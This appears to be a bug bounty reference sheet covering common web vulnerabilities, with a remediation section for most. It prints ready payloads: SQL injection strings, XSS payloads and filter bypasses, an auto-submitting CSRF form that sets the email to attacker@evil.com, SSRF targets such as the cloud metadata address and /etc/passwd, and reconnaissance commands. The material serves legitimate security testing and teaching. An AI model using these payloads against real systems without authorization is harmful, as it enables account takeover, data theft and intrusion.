# Vulnerability Types Reference

Comprehensive testing guides for common bug bounty findings.

---

## SQL Injection (SQLi)

### Detection
```
' OR '1'='1
' OR '1'='1' --
' UNION SELECT null,null --
1 AND 1=1
1 AND 1=2
```

### Common Injection Points
- URL parameters: `?id=1`
- POST data: `username=admin&password=test`
- Headers: `X-Forwarded-For`, `User-Agent`, `Cookie`
- JSON/XML body parameters
- Search boxes, filters, sorting

### Testing Steps
1. Add single quote `'` to parameter, look for SQL errors
2. Test boolean logic: `AND 1=1` vs `AND 1=2`
3. Test time delay: `SLEEP(5)`, `pg_sleep(5)`, `WAITFOR DELAY`
4. Use sqlmap for automation: `sqlmap -u URL --batch`

### Impact
- Data exfiltration
- Authentication bypass
- Remote code execution (in some cases)

### Remediation
- Use parameterized queries/prepared statements
- Input validation and sanitization
- Least privilege database accounts

---

## Cross-Site Scripting (XSS)

### Types

**Reflected XSS**
- Payload in URL/params, immediate reflection
- Test: `<script>alert(1)</script>` in search params
- Social engineering required for exploitation

**Stored XSS**
- Payload stored in database, shown to other users
- Test in: comments, profiles, messages, usernames
- Higher impact - affects multiple users

**DOM XSS**
- Vulnerability in client-side JavaScript
- Source → Sink analysis required
- Common sources: `location.href`, `document.URL`, `window.name`
- Common sinks: `innerHTML`, `document.write`, `eval()`, `setTimeout`

### Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
'"-alert(1)-"'
```

### Bypass Techniques
- Case variation: `<ScRiPt>`
- Encoding: `&#x3C;script&#x3E;`
- Alternative events: `onmouseover`, `onfocus`, `onerror`
- Polyglot payloads

### Remediation
- Output encoding based on context (HTML, JS, CSS, URL)
- Content Security Policy (CSP)
- Input validation (whitelist approach)

---

## CSRF (Cross-Site Request Forgery)

### Detection
1. Find state-changing actions (password change, email update, transfer)
2. Check for anti-CSRF tokens
3. Test if action works without token
4. Check SameSite cookie attribute

### Exploitation
```html
<form action="https://target.com/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="submit" value="Click here for free money">
</form>
<script>document.forms[0].submit();</script>
```

### Remediation
- Anti-CSRF tokens (unpredictable, session-bound)
- SameSite cookies (Lax or Strict)
- Re-authentication for sensitive actions
- Custom headers for AJAX requests

---

## SSRF (Server-Side Request Forgery)

### Detection
- URL parameters that fetch remote resources
- Webhooks, image uploads, PDF generation
- File import features

### Test Payloads
```
http://localhost/
http://127.0.0.1/
http://169.254.169.254/ (AWS metadata)
http://[::1]/
file:///etc/passwd
http://0177.0.0.1/ (octal bypass)
```

### Impact
- Access internal services
- Cloud metadata theft
- Port scanning from server
- Internal admin panel access

### Remediation
- Whitelist allowed domains/IPs
- Disable unnecessary URL schemes
- Network segmentation
- Use authenticated requests only

---

## IDOR (Insecure Direct Object Reference)

### Detection
1. Identify object references in URLs/parameters
   - `/api/users/123/profile`
   - `?document_id=456`
   - `POST /api/orders {"order_id": 789}`

2. Change the ID to another user's ID
3. Check if you can access/modify their data

### Common Targets
- User profiles, documents, orders
- API endpoints
- Download links
- Delete/restore functions

### Testing
```bash
# Original request
curl "https://api.target.com/orders/12345" -H "Authorization: Bearer TOKEN"

# Test IDOR
curl "https://api.target.com/orders/12346" -H "Authorization: Bearer TOKEN"

# Test with other user's ID
curl "https://api.target.com/orders/10001" -H "Authorization: Bearer TOKEN"
```

### Remediation
- Implement proper authorization checks
- Use indirect references (UUIDs instead of sequential IDs)
- Validate user permissions on every request

---

## Authentication Bypass

### Common Vectors

**JWT Issues**
- Algorithm confusion (alg: none)
- Weak secrets (crack with jwt_tool)
- Key confusion attacks

**Session Management**
- Predictable session IDs
- Session fixation
- Missing HttpOnly/Secure flags
- Long session expiration

**Password Reset Flaws**
- Predictable reset tokens
- Token not invalidated after use
- Rate limiting bypass
- Host header injection in reset emails

**2FA Bypass**
- Brute force OTP (no rate limiting)
- Backup codes not properly secured
- 2FA not enforced on all endpoints
- Response manipulation (changing `2fa_required: false`)

---

## Information Disclosure

### Common Sources
- Source code comments (`<!-- TODO: remove this in prod -->`)
- Error messages with stack traces
- Debug endpoints (`/debug`, `/console`, `/_profiler`)
- API responses with extra fields
- Backup files (`.bak`, `.old`, `.zip`)
- Directory listing enabled
- `.git` folder exposed
- `.env` files
- Robots.txt / sitemap.xml

### Tools
```bash
# Git exposure
git-dumper https://target.com/.git/ ./source

# Backup file finder
gobuster dir -u https://target.com -w backup-files.txt -x bak,old,zip,sql

# JS secrets
nuclei -u https://target.com -t exposures/
```

---

## Business Logic Flaws

### Examples
- Price manipulation in cart
- Negative quantity orders
- Skipping steps in multi-step processes
- Race conditions (coupon reuse)
- Time-based attacks (booking systems)

### Testing Approach
1. Understand the business flow
2. Identify assumptions made by developers
3. Test edge cases and boundary conditions
4. Look for race conditions (turbo intruder)

---

## More Vulnerabilities

See also:
- XXE (XML External Entity)
- LFI/RFI (Local/Remote File Inclusion)
- Command Injection
- Path Traversal
- Host Header Injection
- Clickjacking
- CORS Misconfiguration
- Cache Poisoning
- HTTP Request Smuggling
